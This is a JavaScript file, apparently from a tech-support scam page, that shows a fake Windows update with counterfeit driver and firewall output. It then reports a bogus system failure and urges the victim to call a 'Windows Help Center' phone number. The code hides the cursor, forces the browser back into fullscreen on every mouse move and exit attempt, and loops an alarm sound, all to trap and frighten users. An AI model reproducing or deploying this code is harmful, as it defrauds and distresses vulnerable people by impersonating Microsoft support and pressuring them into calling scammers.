const firstPage = document.querySelector('#first-page');
const firstTopBox = document.querySelector('.top-box');
const secondPage = document.querySelector('#second-page');
const thirdPage = document.querySelector('#third-page')
const fourthPage = document.querySelector('#fourth-page')
var aud = document.getElementById("pridez");


document.addEventListener('mousemove', (e) => {
  const popUp = document.querySelector('.popup-container');
  const cursorStyle = (popUp.contains(e.target)) ? 'auto' : 'none';
  document.body.style.cursor = cursorStyle;
});

function closeFirstPopup() {
    firstPage.style.display = 'none';
    document.body.style.cursor = 'none';
    secondPage.style.display = 'flex';  
    simulateF11Key();  
    changeBackground();
    startDownload();
}

function changeBackground() {
document.body.style.background = 'rgba(30, 30, 30, 0.93)';
}

function showDisclaimerPopup() {
const disclaimerPopup = document.querySelector('#disclaimerPopup');
disclaimerPopup.style.display = 'block';
}


// Second Page Effect Function
function startDownload() {
  let percent = document.getElementById("percent");
  let width = 0;
  let downloadInterval = setInterval(() => {
    if (width >= 100) {
      clearInterval(downloadInterval);
      percent.innerHTML = "Update Complete";
      secondPage.style.display = 'none';
      changeBackground2();
      setTimeout(()=>{
        changeBackground();
        thirdPage.style.display = 'block';
      },5000)
      setTimeout(()=>{
        thirdPage.style.display = 'none';
        fourthPage.style.display = 'block';
        setTimeout(()=>{
          changeBackground()
          type();
        },1000)
        setTimeout(()=>{
          downloadSimulation();
        }, 7000);
        setTimeout(()=>{
          type2()
          aud.play()  
        },12000)
      },20000)
    } else {
      width++;
      percent.innerHTML = width + "%" + ' Complete';
    }
  }, 150); // Adjust the speed of download here (smaller number for faster)
}

// fouth page effect fuction
const lines = [
    'Processing: brimi13i.inf',
    'Driver package added successfully.',
    'Published name : oem20.inf',
    'Please wait as this may take a while',
    'Number downloaded successfully: 1',
    'Do not turn off your system, otherwise your data may be lost or your system may be damaged.',
    'Please wait as this may take a while',
    '',
    'C:/Windows/system32>fireutil.exe',
    'Microsoft firewall Utility',
    '',
    'The operating system has been successfully scanned.',
    'Processing : oem12.inf',
    'Driver Pack Providers: Microsoft Technologies',
    'Class: System Devices',
    'Driver version: 6.9.9.4',
	
    'Do not turn off your system, your data may loss or your system get corrupted.',
    // // 'For any querry contact to our help center at +1 XXX XXX XXXX.'
];

let lineIndex = 0;
let charIndex = 0;
const typingText = document.getElementById('typing-text');

function type() {
    if (lineIndex < lines.length) {
      if (charIndex < lines[lineIndex].length) {
        typingText.textContent += lines[lineIndex][charIndex];
        charIndex++;
        setTimeout(type, 0); // Adjust typing speed here (in milliseconds)
      } else {
        typingText.textContent += '\n'; // Move to next line
        lineIndex++;
      //   if(lineIndex === lines.length){
      //   typingText.innerHTML += '<p>Please contact to windows help center at +1 XXX XXX XXXX.</p>'  
      //   // let p = document.querySelector('typingText p');
      //   // p.style.color = 'red'
      // }
        charIndex = 0;
        setTimeout(type, 0); // Delay before typing next line (in milliseconds)
      }
    }
}

const textElement = document.getElementById('text');
const progressBar = document.getElementById('progress-bar');

function downloadSimulation(){
    let progress = 0;
    const downloadInterval = setInterval(function() {
      progress += 10
      let progressBarText = '[';
      let filledBars = Math.floor(progress / 4.3);
      for (let i = 0; i < 25; i++) {
        progressBarText += (i < filledBars) ? '▮' : '-'; // Filled with '▮' or unfilled with '-'
      }
      const percentage = '] ' + (filledBars * 4) + '%';
      textElement.textContent = 'Update-processing: ';
      progressBar.textContent = progressBarText + percentage;
      if (progress >= 93) {
        clearInterval(downloadInterval); // Stop download when complete
        textElement.textContent = 'Update failed!';
        textElement.style.color = 'red'
        progressBar.style.display = 'none'
        aud.currentTime = 0;
      } 
      // else if (progress >= 0) {
      //   // aud.play();
        
      // }
    }, Math.random(100) * 700); // Adjust the interval for updating progress (milliseconds)
}

let lines2 = [
  'System failure due to unusual activity.',
  'Do not turn off your computer as this may cause system damage or data loss.',
  'Contact the Windows Help Center at +1 (201) 643-7402.'
]

let lineInd = 0;
let charInd = 0;
const typingText2 = document.getElementById('typing-text2');

function type2() {
    if (lineInd < lines2.length) {
      if (charInd < lines2[lineInd].length) {
        typingText2.textContent += lines2[lineInd][charInd];
        charInd++;
        setTimeout(type2, 0); // Adjust typing speed here (in milliseconds)
      } else {
        typingText2.textContent += '\n'; // Move to next line
        lineInd++;
        charInd = 0;
        setTimeout(type2, 0); // Delay before typing next line (in milliseconds)        
        setInterval(()=>{
          aud.play()
        },12000)
      }
    }
}

// Third Page Scripting

function changeBackground2(){
  document.body.style.backgroundColor = 'black'
}

function simulateF11Key() {
  function enterFullScreen() {
      var el = document.documentElement,
          rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen;
      rfs.call(el);
  }
  
  function handleFullScreenChange() {
      if (
          !document.fullscreenElement &&
          !document.webkitFullscreenElement &&
          !document.mozFullScreenElement
      ) {
          enterFullScreen();
      }
  }
  
  document.addEventListener("mousemove", enterFullScreen);
  document.addEventListener("fullscreenchange", handleFullScreenChange);
  document.addEventListener("webkitfullscreenchange", handleFullScreenChange);
  document.addEventListener("mozfullscreenchange", handleFullScreenChange);
}   
